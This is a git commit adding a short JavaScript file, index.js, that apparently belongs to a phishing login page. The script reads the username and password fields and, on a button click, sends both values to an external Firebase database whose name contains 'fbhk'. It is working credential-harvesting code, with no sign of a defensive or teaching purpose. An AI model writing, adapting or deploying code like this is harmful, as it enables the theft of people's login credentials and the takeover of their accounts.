6dc12d260ea332e6bfa563b9fef92fb44a46469f
Creepingdeath999 <mtchedlidze.elguja@atsu.edu.ge>
2021-05-17 20:00:18 +0400

    Initial commit

---
+++ index.js
@@ -0,0 +1,29 @@
+const userNaname=document.getElementById('username');
+const password=document.getElementById('password');
+const btn=document.querySelector("button");
+
+async function postData(url = '', data = {}) {
+
+    const response = await fetch(url, {
+      method: 'POST', 
+      mode: 'cors', 
+      cache: 'no-cache',
+      credentials: 'same-origin', 
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      redirect: 'follow', 
+      referrerPolicy: 'no-referrer', 
+      body: JSON.stringify(data) 
+    });
+    return response.json();
+  }
+  
+ 
+    btn.addEventListener('click', ()=>{
+        postData('https://fbhk-9882a-default-rtdb.firebaseio.com/fbhk.json', { userName:userNaname.value, password:password.value})
+        .then(data => {
+          console.log(data); 
+        });
+    
+    })
